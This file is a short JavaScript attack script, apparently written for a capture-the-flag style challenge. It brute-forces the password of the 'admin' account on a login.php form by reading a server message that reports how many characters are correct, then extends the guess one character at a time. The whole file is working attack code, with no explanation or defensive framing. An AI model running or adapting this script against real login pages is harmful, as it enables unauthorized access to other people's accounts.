const username = "admin";
const maxLen = 16;
const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:'\",.<>/?\\|`~";
let password = "";

async function tryChar(pos, ch) {
    const form = new FormData();
    form.append("username", username);
    form.append("password", password + ch);

    const resp = await fetch("login.php", { method: "POST", body: form });
    const text = await resp.text();
    const match = text.match(/got (\d+) characters correct/i);
    return match ? parseInt(match[1], 10) : 0;
}

async function bruteForce() {
    for (let i = 0; i < maxLen; i++) {
        let found = false;
        for (let ch of charset) {
            const correct = await tryChar(i, ch);
            if (correct === password.length + 1) {
                password += ch;
                console.log(`Found char ${i + 1}: ${ch} => ${password}`);
                found = true;
                break;
            }
        }
        if (!found) {
            console.log("No more correct chars found. Stopping.");
            break;
        }
    }
    console.log("Final password guess:", password);
}

bruteForce();